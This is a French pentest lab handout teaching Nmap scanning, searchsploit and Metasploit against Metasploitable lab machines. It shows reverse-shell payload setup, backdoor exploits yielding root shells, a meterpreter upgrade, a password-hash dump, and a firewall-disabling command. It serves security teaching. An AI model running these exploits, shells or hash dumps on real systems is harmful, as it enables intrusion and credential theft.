---
title: "TP test d'intrusion"
author: [Olivier LASNE - olivier@lasne.pro]
subject: "Pentest"
keywords: [Linux, bash, ligne de commande, shell, administration]
subtitle: "Reconnaissance avec Nmap et utilisation de Metasploit"
lang: "fr"
titlepage: true
...

# Introduction

Dans ce TP, nous allons voir comment utiliser Nmap pour découvrir services présents sur une machine, et récupérer leur version.

Nous verrons aussi comment vérifier si il existe un exploit pour la version utiliser, et comment exploiter une vulnérabilité avec le framework Metasploit.

# Nmap

Nmap est un scanner réseau, il peut être utiliser à la fois pour découvrir les machines présentes sur un réseau, et pour lister les services (et leur version) d'une machine.

Nmap a de nombreuses options, nous ne les détaillerons pas toutes ici.

## Scan basique

Si on lui donne une IP en paramètre, nmap va simplement effectuer un scan de port TCP, et lister les ports ouverts.

_Exemple avec Metasploitable_ :

```bash
$ nmap 192.168.56.210       
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-14 18:46 CET
Nmap scan report for vulnerable (192.168.56.210)
Host is up (0.00050s latency).
Not shown: 976 closed ports
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3306/tcp  open  mysql
3389/tcp  open  ms-wbt-server
4848/tcp  open  appserv-http
7676/tcp  open  imqbrokerd
8009/tcp  open  ajp13
8022/tcp  open  oa-system
8031/tcp  open  unknown
8080/tcp  open  http-proxy
8181/tcp  open  intermapper
8383/tcp  open  m2mservices
8443/tcp  open  https-alt
9200/tcp  open  wap-wsp
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown
49161/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 1.70 seconds
```

## Découvrir les machines présentes sur un réseau

### Ping scan

Pour découvrir rapidement les machines présentes sur le réseau, on peut faire simplement un ping scan :

    nmap -sn 10.11.1.1-254

### Top ports

Néanmoins, un certain nombre de machines sont configurés pour ne pas répondre aux ping. On peut choisir de scanner uniquement les ports les plus communs 

    nmap 10.11.1.1/24 -Pn --top-ports 10 --open -sS

**`-Pn`** : scan les ports même si la machine ne réponds pas aux pings.\
**`--top-ports xx`** : scan uniquement les __xx__ ports les plus communs.\
**`--open`** : dans la sortie indique uniquement les ports ouverts.\
**`-sS`** : **syn** scan, effectue seulement la 1ère partie du handshake TCP et est donc plus rapide. Peut-être également plus discret, mais est généralement détecté aujourd'hui.

### Enregister les résultats

Nmap support 3 formats d'enregistrement

**`-oN`** : format texte classique. Identique à la sortie de la console.\
**`-oG`** : _grepable nmap_, optimisé pour une recherche dans les résultats avec `grep`\
**`-oX`** : format xml. Peut permettre de **reprendre un scan interrompu**, et l'importation des résultats dans certains outils comme **Metasploit**.


## Scanner une machine

Une fois notre cible définie, on va chercher à avoir un maximum d'information.

### Options communes

Avant d'attaquer une machine, on va généralement effectuer un __scan TCP complet__ avec les options suivantes :

    nmap -sV -sC -O -p- 192.168.56.210 -oN full.nmap

**`-p-`** va indiquer que l'on liste absolument tous les ports\
**`-sV`** indique que l'on veut récupérer les informations de version\
**`-sC`** indique que l'on lance les _scripts nmap_ de récupération d'information qui n'ont pas d'effet de bord\
**`-O`**  signifie que nmap va essayer de détecter la version du système d'exploitation présent en face.\
**`-oN`** écrit les résultats dans le fichier `full.nmap`

On réalise généralement un __1er scan de port__ sans l'option `-p-` de façon à avoir uniquement les 1000 ports les plus fréquents. Et dans un second temps un scan avec tous les ports.

### Scan UDP

Un scan UDP peut être (très) long. Néanmoins, il est généralement intéressant d'effectuer un scan au moins des ports les plus fréquents.

    nmap -sU 192.168.56.210 -oN udp.nmap

### Scripts Nmap

Nmap a la possibilité d'__exécuter des scripts__. Les scripts sont stockés dans le dossier __`/usr/share/nmap/scripts`__

Lister les scripts en lien avec SMB :

    ls /usr/share/nmap/scripts | grep smb

On peut obtenir de l'__aide__ sur un __script__ de la façon suivante :
```bash
$ nmap --script-help=smb-os-discovery.nse            
Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-29 11:21 EST

smb-os-discovery
Categories: default discovery safe
https://nmap.org/nsedoc/scripts/smb-os-discovery.html
  Attempts to determine the operating system, computer name, domain, workgroup, and current
  time over the SMB protocol (ports 445 or 139).
  This is done by starting a session with the anonymous
  account (or with a proper user account, if one is given; it likely doesn't make
  a difference); in response to a session starting, the server will send back all this
  information.

  The following fields may be included in the output, depending on the
  circumstances (e.g. the workgroup name is mutually exclusive with domain and forest
  names) and the information available:
  * OS
  * Computer name
[...]
```

__/!\\ Attention :__ par défaut un pare-feu filtre le SMB sur Metasploitable 3. On peut le désactiver avec la commande suivante :
```cmd
netsh advfirewall set allprofile state off
```

Un __script nmap__ est exécuté de la façon suivante :
```sh
$ nmap --script=smb-os-discovery.nse 192.168.56.210 -p139,445
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-14 18:53 CET
Nmap scan report for vulnerable (192.168.56.210)
Host is up (0.00033s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2008 R2 Standard 7601 Service Pack 1 (Windows Server 2008 R2 Standard 6.1)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   Computer name: metasploitable3-win2k8
|   NetBIOS computer name: METASPLOITABLE3\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2020-12-14T09:53:16-08:00

Nmap done: 1 IP address (1 host up) scanned in 0.38 seconds
```


\newpage

# Utilisation d'exploit

Dans le cadre d'un test d'intrusion, on va chercher à savoir s'il existe une vulnérabilité pour une des versions utilisées. À la fois sur des sites comme [cvedetails.com](https://www.cvedetails.com/), et directement sur des moteurs de recherche.

Dans notre cas, on va chercher directement à voir s'il existe __un exploit__. C'est à dire un script exploitant la vulnérabilité.

## Exploit-DB

Le site de référence pour les exploits publiques est __[exploit-db.com](https://www.exploit-db.com/)__.

On peut effecter des recherches directement sur l'interface web, mais il existe sous kali directement un outil en ligne de commande : __`searchsploit`__.

```bash
$ searchsploit vsftpd
---------------------------------------------- ----------------------
 Exploit Title                                |  Path
---------------------------------------------- ----------------------
vsftpd 2.0.5 - 'CWD' (Authenticated) Remote M | linux/dos/5814.pl
vsftpd 2.0.5 - 'deny_file' Option Remote Deni | windows/dos/31818.sh
vsftpd 2.0.5 - 'deny_file' Option Remote Deni | windows/dos/31819.pl
vsftpd 2.3.2 - Denial of Service              | linux/dos/16270.c
vsftpd 2.3.4 - Backdoor Command Execution (Me | unix/remote/17491.rb
---------------------------------------------- ----------------------
```

On peut utiliser l'option **`-u`** pour mettre à jour la base de données. `searchsploit -u`

L'option **`-x`** pour voir le détail d'un exploit. `searchsploit -x unix/remote/17491.rb`.

Et l'option __`-m`__ pour en faire une copie dans le dossier courant. `searchsploit -m unix/remote/17491.rb`

Il n'y a pas d'unité sur la façon dont ces scripts sont écrits, et il est souvent nécessaire de les adapter.

### Convertir un fichier au format CRLF
Il est parfois nécessaire de convertir les fichiers écrit sous Windows (convention CRLF). Pour cela on peut simplement utiliser l'outil `dos2unix`.

```sh
$ file 31819.pl
31819.pl: ASCII text, with CRLF line terminators

$ dos2unix 31819.pl
dos2unix: converting file 31819.pl to Unix format...

$ file 31819.pl
31819.pl: ASCII text
```

## Metasploit

Metasploit est un __framework d'attaque__. Il intègre un nombre important d'__exploits__ et de __payloads__ et permet de les utiliser de façon unifiée.\
Il intègre notamment des exploits très complexes comme ceux pour la vulnérabilité __MS17-010__.

Son intérêt réside aussi dans le shell __meterpreter__ et les nombreux modules de __post-exploitation__ qu'il intègre.

### Démarrer la base de données

Metasploit utilise une base de données postgresql. Avant d'utiliser le framework il est nécessaire de démarrer la base de données avec la commande __`msfdb run`__.

L'état de la base de données peut être vérifiée avec `msfdb status`.

### Msfconsole

On lance le framework avec la commande __`msfconsole`__.


    $ msfconsole
    IIIIII    dTb.dTb        _.---._
      II     4'  v  'B   .'"".'/|\`.""'.
      II     6.     .P  :  .' / | \ `.  :
      II     'T;. .;P'  '.'  /  |  \  `.'
      II      'T; ;P'    `. /   |   \ .'
    IIIIII     'YvP'       `-.__|__.-'

    I love shells --egypt


           =[ metasploit v6.0.17-dev                          ]
    + -- --=[ 2076 exploits - 1124 auxiliary - 352 post       ]
    + -- --=[ 592 payloads - 45 encoders - 10 nops            ]
    + -- --=[ 7 evasion                                       ]

    Metasploit tip: You can use help to view all available commands
    
    msf6 >

Pour obtenir de l'aide, il existe la commande `help`, ainsi que l'option `-h` les différentes commandes.

À noter que metasploit supporte aussi l'autocomplétion avec **Tab**.

Metasploit a 4 catégories de modules principaux :

- auxiliary
- exploits
- payloads
- post

#### Exploit :
La collection d'exploit de Metasploit. Ils sont classés par architecture de la cible, et protocole.

#### Auxilary : 
Va contenir les scanners, fuzzeurs, sniffer, etc.

#### Payload, Encoders, Nops : 
Ensemble de charges malveillantes, et les encodeurs nécessaires pour qu'il atteignent leur destination intacts.

#### Post :
Ensemble de modules qui aident à la phase de post-exploitation.


### Rechercher un exploit / module

On peut utiliser la commande `search` pour chercher un module.

```sh
msf6 > search proftp

Matching Modules
================

   #  Name                                         Disclosure Date  Rank       Check  Description
   -  ----                                         ---------------  ----       -----  -----------
   0  exploit/freebsd/ftp/proftp_telnet_iac        2010-11-01       great      Yes    ProFTPD 1.3.2rc3 - 1.3.3b Telnet IAC Buffer Overflow (FreeBSD)
   1  exploit/linux/ftp/proftp_sreplace            2006-11-26       great      Yes    ProFTPD 1.2 - 1.3.0 sreplace Buffer Overflow (Linux)
   2  exploit/linux/ftp/proftp_telnet_iac          2010-11-01       great      Yes    ProFTPD 1.3.2rc3 - 1.3.3b Telnet IAC Buffer Overflow (Linux)
   3  exploit/linux/misc/netsupport_manager_agent  2011-01-08       average    No     NetSupport Manager Agent Remote Buffer Overflow
   4  exploit/unix/ftp/proftpd_133c_backdoor       2010-12-02       excellent  No     ProFTPD-1.3.3c Backdoor Command Execution
   5  exploit/unix/ftp/proftpd_modcopy_exec        2015-04-22       excellent  Yes    ProFTPD 1.3.5 Mod_Copy Command Execution
   6  exploit/windows/ftp/proftp_banner            2009-08-25       normal     No     ProFTP 2.9 Banner Remote Buffer Overflow


Interact with a module by name or index. For example info 6, use 6 or use exploit/windows/ftp/proftp_banner
```

### Utiliser un module

Pour utiliser un module on utilise la commande `use`.

```sh
msf6 > use exploit/unix/ftp/proftpd_133c_backdoor
msf6 exploit(unix/ftp/proftpd_133c_backdoor) >
```

### Obtenir des infos

On utilise la commande `show info` pour obtenir des informations sur un module.

Pour lister les options d'un module, on utilise `show options`.

```sh
msf6 exploit(unix/ftp/proftpd_133c_backdoor) > options

Module options (exploit/unix/ftp/proftpd_133c_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  192.168.3.173    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT   21               yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic

```

Les principales options sont __RHOSTS__ qui contient l'IP de la machine cible, et __RPORT__ qui indique le port où tourne le service cible.

Les options se configurent avec la commande __`set`__ :

```sh
msf6 exploit(unix/ftp/proftpd_133c_backdoor) > set RHOSTS 192.168.3.173
RHOSTS => 192.168.3.173
```


### Choix du payloads

Les **payloads compatibles** peuvent être listés avec la commande `show payloads`. Si compatible, on choisira généralement `windows/meterpreter/reverse_tcp`, `linux/x86/meterpreter/reverse_tcp` ou `linux/x64/meterpreter/reverse_tcp`.

Pour selectionner un payload, on utilisera de la même façon la commande `set`.

```sh
msf6 exploit(windows/smb/ms17_010_psexec) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp

```

Une fois le __payload__ définit. Il est souvent nécessaire de le configurer en définissant __LHOST__ (adresse à laquel le payload vient se connecter).

On le configure de la même manière que RHOSTS avec la commande __set__.

```sh
msf6 exploit(windows/smb/ms17_010_psexec) > set LHOST 192.168.56.101
LHOST => 192.168.56.101
```

Une fois qu'un payload a été définit. Ses __options__ appraissent également dans la sortie de la commande __`options`__.

```sh
msf6 exploit(windows/smb/ms17_010_psexec) > options
[...]

Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.56.101   yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port

```

### Executer un exploit

Sur les exploits qui le supportent, on peut utiliser la commande `check` pour vérifier si la cible est vulnérable.

```sh
msf6 exploit(windows/smb/ms17_010_psexec) > check

[*] 172.16.237.130:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[-] 172.16.237.130:445    - Host does NOT appear vulnerable.
[*] 172.16.237.130:445    - Scanned 1 of 1 hosts (100% complete)
[*] 172.16.237.130:445 - Cannot reliably check exploitability.
```

Finalement, on utilise la commande `run` pour exécuter l'exploit.

```sh
msf6 exploit(unix/ftp/proftpd_133c_backdoor) > run 

[*] Started reverse TCP double handler on 192.168.3.8:4444 
[*] 192.168.3.173:21 - Sending Backdoor Command
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo Fcjmid852usWprlr;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket A
[*] A: "Fcjmid852usWprlr\r\n"
[*] Matching...
[*] B is input...
[*] Command shell session 1 opened (192.168.3.8:4444 -> 192.168.3.173:42450) at 2021-01-25 15:55:09 +0100

id
uid=0(root) gid=0(root) groups=0(root),65534(nogroup)

```

### Améliorer son Shell

Lorsque l'on obtient un shell un peu minimaliste à travers un exploit. On peut utiliser la commande suivante pour avoir un shell un peu plus classe. 

```sh
python -c "import pty;pty.spawn('/bin/bash')"
```

(Il est parfois nécessaire de préciser la version de python : `python2` ou `python3`).

### Les sessions

Un shell ou **session** peuvt être mis en arrière plan avec la commande `background` ou le raccourci _Ctrl + Z_.

On peut lister les sessions avec la commande `sessions`.

```sh
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > sessions

Active sessions
===============

  Id  Name  Type            Information  Connection
  --  ----  ----            -----------  ----------
  1         shell cmd/unix               0.0.0.0:0 -> 172.16.237.130:6200 (172.16.237.130)
```

On peut récupérer une session interactive avec la commande `session -i`.

```sh
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > sessions -i 1
[*] Starting interaction with 1...

whoami
root
```

## Passer à un Shell Meterpreter

```sh
msf6 post(linux/gather/hashdump) > use post/multi/manage/shell_to_meterpreter 
msf6 post(multi/manage/shell_to_meterpreter) > info

       Name: Shell to Meterpreter Upgrade
     Module: post/multi/manage/shell_to_meterpreter
   Platform: Linux, OSX, Unix, Solaris, BSD, Windows
       Arch: 
       Rank: Normal

Provided by:
  Tom Sellers <tom@fadedcode.net>

Compatible session types:
  Shell

Basic options:
  Name     Current Setting  Required  Description
  ----     ---------------  --------  -----------
  HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
  LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).
  LPORT    4433             yes       Port for payload to connect to.
  SESSION                   yes       The session to run this module on.

Description:
  This module attempts to upgrade a command shell to meterpreter. The 
  shell platform is automatically detected and the best version of 
  meterpreter for the target is selected. Currently 
  meterpreter/reverse_tcp is used on Windows and Linux, with 
  'python/meterpreter/reverse_tcp' used on all others.

msf6 post(multi/manage/shell_to_meterpreter) > set LHOST 192.168.3.8
LHOST => 192.168.3.8
msf6 post(multi/manage/shell_to_meterpreter) > set SESSION 2
SESSION => 2
msf6 post(multi/manage/shell_to_meterpreter) > run

[*] Upgrading session ID: 2
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 192.168.3.8:4433 
[*] Sending stage (976712 bytes) to 192.168.3.173
[*] Meterpreter session 3 opened (192.168.3.8:4433 -> 192.168.3.173:48406) at 2021-01-25 16:11:34 +0100

```

## Utiliser le module hashdump

```bash
msf6 post(multi/manage/shell_to_meterpreter) > use post/linux/gather/hashdump
msf6 post(linux/gather/hashdump) > info

       Name: Linux Gather Dump Password Hashes for Linux Systems
     Module: post/linux/gather/hashdump
   Platform: Linux
       Arch: 
       Rank: Normal

Provided by:
  Carlos Perez <carlos_perez@darkoperator.com>

Compatible session types:
  Meterpreter
  Shell

Basic options:
  Name     Current Setting  Required  Description
  ----     ---------------  --------  -----------
  SESSION  2                yes       The session to run this module on.

Description:
  Post Module to dump the password hashes for all users on a Linux 
  System

msf6 post(linux/gather/hashdump) > set SESSION 3
SESSION => 3
msf6 post(linux/gather/hashdump) > run

[+] marlinspike:$6$wQb5nV3T$xB2WO/jOkbn4t1RUILrckw69LR/0EMtUbFFCYpM3MUHVmtyYW9.ov/aszTpWhLaC2x6Fvy5tpUUxQbUhCKbl4/:1000:1000:marlinspike,,,:/home/marlinspike:/bin/bash
[+] Unshadowed Password File: /home/kali/.msf4/loot/20210125161302_default_192.168.3.173_linux.hashes_892766.txt
[*] Post module execution completed
```



**Exercice :**

1. Utiliser l'exploit **vsftpd** pour obtenir un shell sur Metasploitable
2. Utiliser un autre exploit pour obtenir un shell.

------------------------------------------------------------


\newpage

# Metasploitable 2

__Exercice :__

Commencer par le __ftp__ et __ircd__.

## Nmap

On commence par un scan __`nmap`__.

```bash
# Nmap 7.80 scan initiated Tue Jan 26 09:21:25 2021 as: nmap -sV -sC -O -p- -oN fullscan.nmap 192.168.56.115
Nmap scan report for 192.168.56.115
Host is up (0.0032s latency).
Not shown: 65505 closed ports
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.56.114
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp    open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
23/tcp    open  telnet      Linux telnetd
25/tcp    open  smtp        Postfix smtpd
|_smtp-commands: metasploitable.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
|_ssl-date: 2021-01-26T09:23:52+00:00; -1s from scanner time.
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|_    SSL2_DES_64_CBC_WITH_MD5
53/tcp    open  domain      ISC BIND 9.4.2
| dns-nsid: 
|_  bind.version: 9.4.2
80/tcp    open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
|_http-server-header: Apache/2.2.8 (Ubuntu) DAV/2
|_http-title: Metasploitable2 - Linux
111/tcp   open  rpcbind     2 (RPC #100000)
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
512/tcp   open  exec        netkit-rsh rexecd
513/tcp   open  login
514/tcp   open  shell       Netkit rshd
1099/tcp  open  java-rmi    GNU Classpath grmiregistry
1524/tcp  open  bindshell   Metasploitable root shell
2049/tcp  open  nfs         2-4 (RPC #100003)
2121/tcp  open  ftp         ProFTPD 1.3.1
3306/tcp  open  mysql       MySQL 5.0.51a-3ubuntu5
| mysql-info: 
|   Protocol: 10
|   Version: 5.0.51a-3ubuntu5
|   Thread ID: 10
|   Capabilities flags: 43564
|   Some Capabilities: Support41Auth, SupportsCompression, SupportsTransactions, LongColumnFlag, SwitchToSSLAfterHandshake, Speaks41ProtocolNew, ConnectWithDatabase
|   Status: Autocommit
|_  Salt: &u=n4V4A+Q8beU[JAG}c
3632/tcp  open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
5432/tcp  open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
|_ssl-date: 2021-01-26T09:23:52+00:00; -1s from scanner time.
5900/tcp  open  vnc         VNC (protocol 3.3)
| vnc-info: 
|   Protocol version: 3.3
|   Security types: 
|_    VNC Authentication (2)
6000/tcp  open  X11         (access denied)
6667/tcp  open  irc         UnrealIRCd
6697/tcp  open  irc         UnrealIRCd
8009/tcp  open  ajp13       Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
8180/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/5.5
8787/tcp  open  drb         Ruby DRb RMI (Ruby 1.8; path /usr/lib/ruby/1.8/drb)
35476/tcp open  java-rmi    GNU Classpath grmiregistry
39503/tcp open  mountd      1-3 (RPC #100005)
47722/tcp open  nlockmgr    1-4 (RPC #100021)
58834/tcp open  status      1 (RPC #100024)
MAC Address: 08:00:27:83:DC:29 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.33
Network Distance: 1 hop
Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h14m59s, deviation: 2h30m01s, median: -1s
|_nbstat: NetBIOS name: METASPLOITABLE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: metasploitable
|   NetBIOS computer name: 
|   Domain name: localdomain
|   FQDN: metasploitable.localdomain
|_  System time: 2021-01-26T04:23:43-05:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jan 26 09:25:07 2021 -- 1 IP address (1 host up) scanned in 222.17 seconds

```

## IRC

On voit avec le scan nmap que l'on a un UnrealIRCd.
```
6667/tcp  open  irc         UnrealIRCd
```

La version n'est pas indiquée, mais on peut regarder s'il existe un exploit.
```bash
$searchsploit unrealirc
------------------------------------------------------------ ---------------------------------
 Exploit Title                                              |  Path
------------------------------------------------------------ ---------------------------------
UnrealIRCd 3.2.8.1 - Backdoor Command Execution (Metasploit | linux/remote/16922.rb
UnrealIRCd 3.2.8.1 - Local Configuration Stack Overflow     | windows/dos/18011.txt
UnrealIRCd 3.2.8.1 - Remote Downloader/Execute              | linux/remote/13853.pl
UnrealIRCd 3.x - Remote Denial of Service                   | windows/dos/27407.pl
------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

Il existe plusieurs exploits pour la version 3.2.8.1.

On lance metasploit avec ```sudo msfdb run```.

On peut ensuite recherche l'exploit avec la commande `search`. On peut ensuite le selectionner avec `use`.

```bash
msf6 > search unrealirc

Matching Modules
================

   #  Name                                        Disclosure Date  Rank       Check  Description
   -  ----                                        ---------------  ----       -----  -----------
   0  exploit/unix/irc/unreal_ircd_3281_backdoor  2010-06-12       excellent  No     UnrealIRCD 3.2.8.1 Backdoor Command Execution

msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > 
```

On peut utiliser la commande `info` pour en savoir un peut plus sur l'exploit.

`options` nous indique qu'il faut définir une IP distante et un port. On définit l'IP distante avec `set`

```bash
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > options

Module options (exploit/unix/irc/unreal_ircd_3281_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT   6667             yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target


msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set RHOSTS 192.168.56.115
RHOSTS => 192.168.56.115
```

On doit également définir un payload. On les liste avec `show payloads`. On peut alors selectionner un payload avec `set payload`.

On va ici choisir le reverse shell `cmd/unix/reverse`.

```bash
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > show payloads

Compatible Payloads
===================

   #   Name                                Disclosure Date  Rank    Check  Description
   -   ----                                ---------------  ----    -----  -----------
   0   cmd/unix/bind_perl                                   manual  No     Unix Command Shell, Bind TCP (via Perl)
   1   cmd/unix/bind_perl_ipv6                              manual  No     Unix Command Shell, Bind TCP (via perl) IPv6
   2   cmd/unix/bind_ruby                                   manual  No     Unix Command Shell, Bind TCP (via Ruby)
   3   cmd/unix/bind_ruby_ipv6                              manual  No     Unix Command Shell, Bind TCP (via Ruby) IPv6
   4   cmd/unix/generic                                     manual  No     Unix Command, Generic Command Execution
   5   cmd/unix/reverse                                     manual  No     Unix Command Shell, Double Reverse TCP (telnet)
   6   cmd/unix/reverse_bash_telnet_ssl                     manual  No     Unix Command Shell, Reverse TCP SSL (telnet)
   7   cmd/unix/reverse_perl                                manual  No     Unix Command Shell, Reverse TCP (via Perl)
   8   cmd/unix/reverse_perl_ssl                            manual  No     Unix Command Shell, Reverse TCP SSL (via perl)
   9   cmd/unix/reverse_ruby                                manual  No     Unix Command Shell, Reverse TCP (via Ruby)
   10  cmd/unix/reverse_ruby_ssl                            manual  No     Unix Command Shell, Reverse TCP SSL (via Ruby)
   11  cmd/unix/reverse_ssl_double_telnet                   manual  No     Unix Command Shell, Double Reverse TCP SSL (telnet)

msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set PAYLOAD cmd/unix/reverse
PAYLOAD => cmd/unix/reverse
```

On peut voir les options du `PAYLOAD` avec la commande `options` désormais.\
On définit en LHOST notre IP sur l'interface réseau privé hôte.

```bash
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > options 

Module options (exploit/unix/irc/unreal_ircd_3281_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  192.168.56.115   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT   6667             yes       The target port (TCP)


Payload options (cmd/unix/reverse):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target


msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > ifconfig eth1
[*] exec: ifconfig eth1

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.56.114  netmask 255.255.255.0  broadcast 192.168.56.255
        inet6 fe80::1a48:bca4:d564:58c2  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:88:5a:59  txqueuelen 1000  (Ethernet)
        RX packets 230134  bytes 19110225 (18.2 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 250743  bytes 35448926 (33.8 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set LHOST 192.168.56.114
LHOST => 192.168.56.114
```

On enfin executer l'exploit, et obtenir notre reverse shell:
```bash
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > run

[*] Started reverse TCP double handler on 192.168.56.114:4444 
[*] 192.168.56.115:6667 - Connected to 192.168.56.115:6667...
    :irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...
    :irc.Metasploitable.LAN NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
[*] 192.168.56.115:6667 - Sending backdoor command...
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo QWVjfmiAcpLxvElQ;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "QWVjfmiAcpLxvElQ\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 1 opened (192.168.56.114:4444 -> 192.168.56.115:48374) at 2021-01-26 09:50:33 +0000

id
uid=0(root) gid=0(root)
```

## Java RMI

#### Selectionner le payload

```bash
msf6 exploit(multi/misc/java_rmi_server) > search type:exploit java_rmi

Matching Modules
================

   #  Name                                            Disclosure Date  Rank       Check  Description
   -  ----                                            ---------------  ----       -----  -----------
   0  exploit/multi/browser/java_rmi_connection_impl  2010-03-31       excellent  No     Java RMIConnectionImpl Deserialization Privilege Escalation
   1  exploit/multi/misc/java_rmi_server              2011-10-15       excellent  No     Java RMI Server Insecure Default Configuration Java Code Execution


Interact with a module by name or index, for example use 1 or use exploit/multi/misc/java_rmi_server

msf6 exploit(multi/misc/java_rmi_server) > use exploit/multi/misc/java_rmi_server
[*] Using configured payload java/meterpreter/reverse_tcp
```

```
msf6 exploit(multi/misc/java_rmi_server) > info

       Name: Java RMI Server Insecure Default Configuration Java Code Execution
     Module: exploit/multi/misc/java_rmi_server
   Platform: Java, Linux, OSX, Solaris, Windows
       Arch: 
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2011-10-15

Provided by:
  mihi

Available targets:
  Id  Name
  --  ----
  0   Generic (Java Payload)
  1   Windows x86 (Native Payload)
  2   Linux x86 (Native Payload)
  3   Mac OS X PPC (Native Payload)
  4   Mac OS X x86 (Native Payload)

Check supported:
  No

Basic options:
  Name       Current Setting  Required  Description
  ----       ---------------  --------  -----------
